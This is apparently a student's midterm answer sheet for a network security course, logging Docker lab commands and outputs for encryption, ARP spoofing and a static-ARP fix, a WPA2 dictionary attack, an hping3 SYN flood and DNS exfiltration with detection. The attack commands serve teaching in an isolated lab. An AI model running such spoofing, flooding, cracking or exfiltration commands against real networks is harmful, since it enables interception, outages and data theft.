# JAWABAN UTS NETWORK SECURITY

**NIM**: [24552011216]    
**KASUS**: [9]

## Perhitungan Kasus
- Digit NIM: [2,4,5,5,2,0,1,1,2,1,6]
- Jumlah: [29]
- Sisa Bagi 10: [9]
- Kasus: [9]

## Tugas 1 (Pertemuan 1): Docker dan Volume
**Perintah 1**
```bash
docker volume create vol-k9
```
**Output**
```text
vol-k9
```
**Perintah 2**
```bash
docker run --name w-k9 -v vol-k9:/data alpine sh -c 'echo 24552011216 > /data/laporan-k9.txt'
```
**Output**
```text
none
```
**Perintah 3**
```bash
docker rm w-k9
```
**Output**
```text
w-k9
```
**Perintah 4**
```bash
docker run --rm -v vol-k9:/data alpine cat /data/laporan-k9.txt
```
**Output**
```text
24552011216
```
**Perintah 5**
```bash
docker compose -p k9 -f 01-sumber-lab/b/b1-compose/docker-compose.yml up-d
```
**Output**
```text
[+] Running 2/2
✓ Container k9-target-1    Started                              0.8s
✓ Container k9-attacker-1  Started                              0.8s
```
**Perintah 5**
```bash
docker compose -p k9 -f 01-sumber-lab/b/bl-compose/docker-compose.yml exec attacker wget -q0- http://target
```
**Output**
```text
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark;}
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to  nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.
Further configuration is required for the web server, reverse proxy,
API gateway, load balancer, content cache, or orther features.</p>

<p>For online documentation and support please refer to
<a href="https://nginx.org/">nginx.org</a>.<br/>
To engage with the community please visit
<a href="https://community.nginx.org/">community.nginx.org</a>.<br/>
For enterprise grade support, professional services, additional
security features and capabilities please refer to
<a href="https://f5.com/nginx">f5.com/nginx</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```
**Perintah 7**
```bash
docker compose -p k9 -f 01-sumber-lab/b/b1-compose/docker-compose.yml down -v
```
**Output**
```text
[+] Running 3/3
✓ Container k9-attacker-1  Removed                              10.3s                              
✓ Container k9-target-1    Removed                              0.3s
✓ Network k9_lab           Removed                              0.1s
```

## Tugas 2 (Pertemuan 2): Kriptografi
**Perintah 1**
```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k9 > laporan-k9.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k9.txt -out laporan-k9.enc -pass pass:kunci-k9-2026 && sha256sum laporan-k9.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k9.enc -out hasil-k9.txt -pass pass:kunci-k9-2026 && sha256sum hasil-k9.txt'
```
**Output**
```text
4bd9129aa11a7d2d2296b1e0ec1120dd9d8d929b789375edf87198a475162a93  laporan-k9.txt
4bd9129aa11a7d2d2296b1e0ec1120dd9d8d929b789375edf87198a475162a93  hasil-k9.txt
```
**Perintah 2**
```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k9.pem -out cert-k9.pem -days 30 -subj /CN=k9.uts.local && openssl x509 -in cert-k9.pem -noout -subject -issuer -dates'
```
**Output**
```text
subject=CN=k9.uts.local
issuer=CN=k9.uts.local
notBefore=Nov 23 05:57:28 2026 GMT
notAfter=Dec 23 05:57:28 2026 GMT
```

## Tugas 3 (Pertemuan 3): ARP spoofing
**Perintah 1**
```bash
docker network create lab-arp-k9
```
**Output**
```text
b078abfabe9a6662b018fd4d08e398a5da7fe463ae86d2ce00cabd87eefc0794
```
**Perintah 2**
```bash
docker run -d --name korban-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
```
**Output**
```text
fcf8af2ee5b829acffcb1ba0b4fbba515fb42ecd75ea1292cd134c41b5752686
```
**Perintah 3**
```bash
docker run -d --name gateway-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
```
**Output**
```text
e9817923d7a934d6a099757570921d88cf5d49136080e9a70ce34cc848cd2c39
```
**Perintah 4**
```bash
docker run -d --name penyerang-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
```
**Output**
```text
df128e4b5894440b433b79e9d898d07d170671a430cec093d52da4af92b119f0
```
**Perintah 5**
```bash
docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9 gateway-k9
```
**Output**
```text
172.18.0.2
172.18.0.3
```
**Perintah 6**
```bash
docker exec korban-k9 arp -a
```
**Output**
```text
gateway-k9.lab-arp-k9 (172.18.0.3) at be:5b:37:87:4c:98 [ether] on eth0
gara (172.18.0.1) at e6:14:eb:a3:2e:70 [ether] on eth0
```
**Perintah 7**
```bash
docker exec -d penyerang-k9 timeout 20 arpspoof -i eth0 -t 172.18.0.2 172.18.0.3
```
**Output**
```text
none
```
**Perintah 8**
```bash
docker exec korban-k9 arp -a
```
**Output**
```text
gateway-k9.lab-arp-k9 (172.18.0.3) at 42:13:31:0d:e7:ef [ether] on eth0
gara (172.18.0.1) at e6:14:eb:a3:2e:70 [ether] on eth0
penyerang-k9.lab-arp-k9 (172.18.0.4) at 42:13:31:0d:e7:ef [ether] on eth0
```
**Perintah 9**
```bash
docker exec korban-k9 arp -s 172.18.0.3 $(docker exec gateway-k9 cat /sys/class/net/eth0/address)
```
**Output**
```text
none
```
**Perintah 10**
```bash
docker exec korban-k9 arp -a
```
**Output**
```text
penyerang-k9.lab-arp-k9 (172.18.0.4) at 42:13:31:0d:e7:ef [ether] on eth0
gara (172.18.0.1) at e6:14:eb:a3:2e:70 [ether] on eth0
gateway-k9.lab-arp-k9 (172.18.0.3) at be:5b:37:87:4c:98 [ether] PERM on eth0
```

## Tugas 4 (Pertemuan 4): Analisis handshake WPA2
**Perintah**
```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k9.txt handshake-k9.cap
```
**Output**
```text
Reading packets, please wait...
Resetting EAPOL Handshake decoder state.
Opening handshake-k9.cap
Read 499 packets.

   #  BSSID              ESSID                     Encryption

   1  00:0B:86:C2:A4:85  linksys                   WPA (1 handshake, with PMKID)

Choosing first network as target.

Reading packets, please wait...
Resetting EAPOL Handshake decoder state.
Opening handshake-k9.cap
Read 499 packets.

1 potential targets

                               Aircrack-ng 1.7 

      [00:00:00] 20/20 keys tested (901.87 k/s) 

      Time left: --

                                KEY NOT FOUND


      Master Key     : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy
**Perintah**
```bash
docker run --rm --network lab-arp-k9 -v "$PWD/01-sumber-lab/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.18.0.2
```
**Output**
```text
Mengirim: IP / ICMP 172.18.0.5 > 172.18.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

## Tugas 6 (Pertemuan 6): SYN flood dan theree-way handshake
**Perintah 1**
```bash
docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml up -d
```
**Output**
```text
[+] Running 3/3
✓ Network k9_lab           Started                              0.7s
✓ Container k9-attacker-1  Started                              0.7s
✓ Container k9-target-1    Started                              0.7s
```
**Perintah 2**
```bash
docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
```
**Output**
```text
0
```
**Perintah 3**
```bash
docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood --rand-source target
```
**Output**
```text
none
```
**Perintah 4**
```bash
docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
```
**Output**
```text
8
```
**Perintah 5**
```bash
docker compose -p k9 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
```
**Output**
```text
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
07:17:18.144359 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [S], seq 4107155652, win 64240, options [mss 1460,sackOK,TS val 2883927288 ecr 0,nop,wscale 10], length 0
07:17:18.144388 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [S.], seq 3677737955, ack 4107155653, win 65160, options [mss 1460,sackOK,TS val 4270507158 ecr 2883927288,nop,wscale 10], length 0
07:17:18.144401 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [.], ack 1, win 63, options [nop,nop,TS val 2883927288 ecr 4270507158], length 0
07:17:18.144465 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [P.], seq 1:71, ack 1, win 63, options [nop,nop,TS val 2883927288 ecr 4270507158], length 70: HTTP: GET / HTTP/1.1
07:17:18.144479 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [.], ack 71, win 64, options [nop,nop,TS val 4270507158 ecr 2883927288], length 0
07:17:18.144634 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [P.], seq 1:239, ack 71, win 64, options [nop,nop,TS val 4270507158 ecr 2883927288], length 238: HTTP: HTTP/1.1 200 OK
07:17:18.144645 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [.], ack 239, win 63, options [nop,nop,TS val 2883927288 ecr 4270507158], length 0
07:17:18.144670 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [P.], seq 239:1135, ack 71, win 64, options [nop,nop,TS val 4270507158 ecr 2883927288], length 896: HTTP
07:17:18.144675 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [.], ack 1135, win 63, options [nop,nop,TS val 2883927288 ecr 4270507158], length 0
07:17:18.145453 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [F.], seq 71, ack 1135, win 63, options [nop,nop,TS val 2883927289 ecr 4270507158], length 0
07:17:18.145488 IP 172.19.0.3.80 > 172.19.0.2.42498: Flags [F.], seq 1135, ack 72, win 64, options [nop,nop,TS val 4270507159 ecr 2883927289], length 0
07:17:18.145496 IP 172.19.0.2.42498 > 172.19.0.3.80: Flags [.], ack 1136, win 63, options [nop,nop,TS val 2883927289 ecr 4270507159], length 0

12 packets captured
12 packets received by filter
0 packets dropped by kernel
```
**Perintah 6**
```bash
docker compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml down -v
```
**Output**
```text
[+] Running 3/3
✓ Container k9-attacker-1  Removed                              10.3s
✓ Container k9-target-1    Removed                              0.3s
✓ Network k9_lab           Removed                              0.1s
```

## Tugas 7 (Pertempuran 7): DNS exfiltration
**Perintah 1**
```bash
docker compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml up -d
```
**Output**
```text
[+] Running 3/3
✓ Network k9-attacker-1    Started                              0.7s
✓ Container k9-attacker-1  Started                              0.7s
✓ Container k9-dns-1       Started                              0.7s
```
**Perintah 2**
```bash
echo -n NIM-24552011216-K9 | xxd -p
```
**Output**
```text
4e494d2d32343535323031313231362d4b39
```
**Perintah 3**
```bash
docker compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 4e494d2d32343535323031313231362d4b39.k9.exfil.lab @dns
```
**Output**
```text
10.0.0.99
```
**Perintah 4**
```bash
docker compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml logs dns > dns-k9.log
```
**Output**
```text
none
```
**Perintah 5**
```bash
python3 01-sumber-lab/kasus/k9-dns-detect/analisis_dns.py dns-k9.log
```
**Output**
```text
Jumlah query per domain induk:
  exfil.lab: 1

Query mencurigakan (label panjang berisi hex):
  panjang=36  4e494d2d32343535323031313231362d4b39.k9.exfil.lab
  ```
**Perintah 6**
```bash
echo 4e494d2d32343535323031313231362d4b39 | xxd -r -p
```
**Output**
```bash
NIM-24552011216-K9
```
**Perintah 7**
```bash
docker compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml down -v
```
**Output**
```text
[+] RUnning 3/3
✓ Container k9-dnd-1       Removed                              0.2s
✓ Container k9-attacker-1  Removed                              10.3s
✓ Network k9_lab           Removed                              0.1s
```
